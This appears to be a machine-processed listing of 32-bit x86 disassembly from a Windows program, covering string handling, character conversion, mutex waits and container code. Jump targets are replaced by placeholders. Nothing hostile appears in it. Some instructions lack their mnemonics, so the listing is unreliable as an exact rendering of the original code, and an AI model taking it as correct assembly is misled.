sub esp 0x10
push ebx
push esi
mov esi ecx
xor eax eax
push edi
mov [ ebp - 0x4 ] esi
cmp [ esi + 0x1c ] eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
add esi 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push 0x0
push eax
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
jb r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
lea edi [ eax + 0x2 ]
push 0x1
push edi
call sub_41acef
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ esi ] cx
mov eax [ edx + 0x44 ]
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
mov esi [ esi ]
push 0x0
push 0x0
push edi
push ebx
push 0xffffffff
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
cmp [ esi + 0x14 ] 0x8
mov edi eax
mov [ esi + 0x10 ] 0x0
jb r-xdata
push 0x10
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_419f97
push r--data
lea edx [ ebp - 0x10 ]
push edx
call sub_41ac98
mov cx [ rw-data ]
mov dl [ rw-data ]
mov [ eax + 0xc ] edi
pop edi
pop esi
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0x64
mov [ eax + 0x7 ] dl
mov [ eax ] 0x0
pop ebx
mov esp ebp
pop ebp
retn
sub_406f50
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_4194e6
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_406c50
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_41a0d6
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_41a0f0
add esp 0xc
sub_407000
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
push edi
mov edi [ ebp + 0x8 ]
sub eax ecx
cmp eax edi
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_4194e6
cmp edi eax
jae r-xdata
mov eax 0x8
push esi
mov esi [ ebx + 0xc ]
shr esi 0x1
lea eax [ ecx + edi ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
add eax eax
add eax eax
add esi esi
add esi esi
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x4 ]
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
lea edx [ esi + ecx ]
push edx
mov [ ebp - 0xc ] eax
call sub_41a460
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp [ ebp - 0x8 ] edi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp + 0x8 ] eax
mov edi eax
lea edx [ edi * 4 ]
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_41a460
mov eax [ ebx + 0x4 ]
lea ecx [ eax + edi * 4 ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_41a460
add esp 0x18
lea edx [ esi + eax ]
test edi edi
je r-xdata
sar esi 0x2
mov edx esi
add edx edx
add edx edx
push edx
push ecx
push eax
mov esi edi
mov [ ebp - 0xc ] edx
call sub_41a460
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi [ ebp - 0x8 ]
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] r--data
call sub_41ac98
int3
add eax eax
add eax eax
push eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
pop esi
test eax eax
je r-xdata
mov ecx edi
mov edi edx
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp + 0x8 ]
add [ ebx + 0x8 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0x4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_41a0d6
add esp 0x4
mov edi [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
[ edi ]
mov edi [ ebp + 0x8 ]
sub_407190
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_419533
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_4194e6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_406c50
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_407280
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_419533
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_4194e6
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_4194e6
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_406c50
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov [ eax ] bl
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
add ecx ebx
add eax ebx
push ecx
add eax edi
push eax
call sub_41a460
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
add ecx [ ebp + 0x10 ]
push edi
push ecx
add eax ebx
push eax
call sub_41a0f0
push edi
add ecx edx
mov eax esi
push ecx
add eax ebx
push eax
call sub_41a460
jmp r-xdata
mov eax [ esi ]
push edi
add ecx edx
push ecx
add eax ebx
push eax
call sub_41a460
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x14 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_407400
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_419533
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_4194e6
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_4194e6
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_401520
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
pop ebx
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
lea ecx [ ecx + ebx * 2 ]
lea edx [ ebx + edi ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_401050
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
lea edx [ edi + edi ]
push edx
mov edx [ ebp + 0x10 ]
lea ecx [ ecx + edx * 2 ]
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_41a0f0
lea ecx [ ecx + edx * 2 ]
mov eax esi
push edi
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_401050
jmp r-xdata
mov eax [ esi ]
lea ecx [ ecx + edx * 2 ]
push edi
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_401050
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax [ ebp + 0x14 ]
add esp 0xc
push eax
mov ecx esi
call sub_401260
sub_407580
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi + 0x38 ] 0x8
jb r-xdata
push eax
call sub_41a7eb
add esp 0x4
xor ecx ecx
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] cx
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_41a0d6
add esp 0x4
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
mov edx [ esi + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
sub_4075e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_419533
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_406bc0
push ebx
push 0x0
mov ecx esi
call sub_406bc0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_406c50
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_4076d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4194e6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_406c50
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_4075e0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_4075e0
pop esi
pop ebx
pop ebp
retn 0x8
sub_4077d0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_419533
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_4194e6
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_401520
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ esi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_4078e0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov ecx esi
mov [ esi ] ax
call sub_403650
mov eax esi
pop esi
pop ebp
retn 0x8
sub_407910
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
add ecx 0x8
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] al
call sub_4075e0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_407940
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_4076d0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_407980
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0x7
mov [ ebp - 0x4 ] eax
mov [ esi ] ax
mov eax [ ebp + 0xc ]
push edx
push eax
push ecx
mov ecx esi
call sub_401ae0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_4079c0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_41a460
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
sub_407a40
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
mov edx [ esi + 0x4 ]
mov ecx eax
shr ecx 0x1
mov ecx [ edx + ecx * 4 ]
and eax 0x1
lea eax [ ecx + eax * 8 ]
push edi
mov edi [ eax + 0x4 ]
test edi edi
je r-xdata
mov ecx [ esi + 0x8 ]
inc [ esi + 0xc ]
add ecx ecx
pop edi
cmp ecx [ esi + 0xc ]
ja r-xdata
lea edx [ edi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
dec [ esi + 0x10 ]
jne r-xdata
mov [ esi + 0xc ] 0x0
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_407ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d448
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edx edx
add ecx 0x3c
cmp [ ecx + 0x14 ] 0x8
mov [ ebp - 0x4 ] edx
mov [ ecx + 0x10 ] edx
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
push 0xffffffff
xor edi edi
mov [ eax ] di
push edx
lea eax [ ebp + 0x8 ]
push eax
call sub_401ae0
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
sub_407b20
push ebp
mov ebp esp
push 0xffffffff
push sub_42d478
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x44 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0xffffffff
push 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0xc ]
call sub_4077d0
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x18 ] 0x0
jae r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
mov [ eax ] cx
mov edx [ esi + 0x44 ]
push edx
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0x2
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
call sub_41ac98
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
mov edx [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
sub_407be0
push ebp
mov ebp esp
push 0xffffffff
push sub_42d4b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
test cl 0x1
jne r-xdata
mov ebx [ esi + 0xc ]
add ebx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov edi ebx
shr edi 0x1
cmp eax edi
ja r-xdata
add eax 0x2
shr eax 0x1
cmp [ esi + 0x8 ] eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
push 0x1
mov ecx esi
call sub_407000
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
and ebx 0x1
lea ecx [ edx + ebx * 8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
push 0x10
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
inc [ esi + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4032e0
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] 0x0
call sub_419f97
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_41ac98
int3
mov ecx [ esi + 0x4 ]
mov [ ecx + edi * 4 ] eax
sub_407cd0
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x10 ] ebx
je r-xdata
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea esp [ esp ]
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
lea esp [ esp ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
lea eax [ eax + ecx - 0x1 ]
mov ecx eax
shr ecx 0x1
cmp edx ecx
ja r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn
push eax
call sub_41a0d6
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + ecx * 4 ]
and eax 0x1
mov edi [ ecx + eax * 8 + 0x4 ]
lea eax [ ecx + eax * 8 ]
cmp edi ebx
je r-xdata
sub ecx edx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
dec [ esi + 0x10 ]
jne r-xdata
lea edx [ edi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov [ esi + 0xc ] ebx
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_407d90
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
push esi
mov esi [ ecx + 0x10 ]
push edi
mov edi [ eax + 0x14 ]
sub edi edx
mov [ ebp - 0x4 ] 0x0
cmp esi edi
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_407190
mov edi [ ecx + 0x14 ]
sub edi esi
cmp edi edx
jb r-xdata
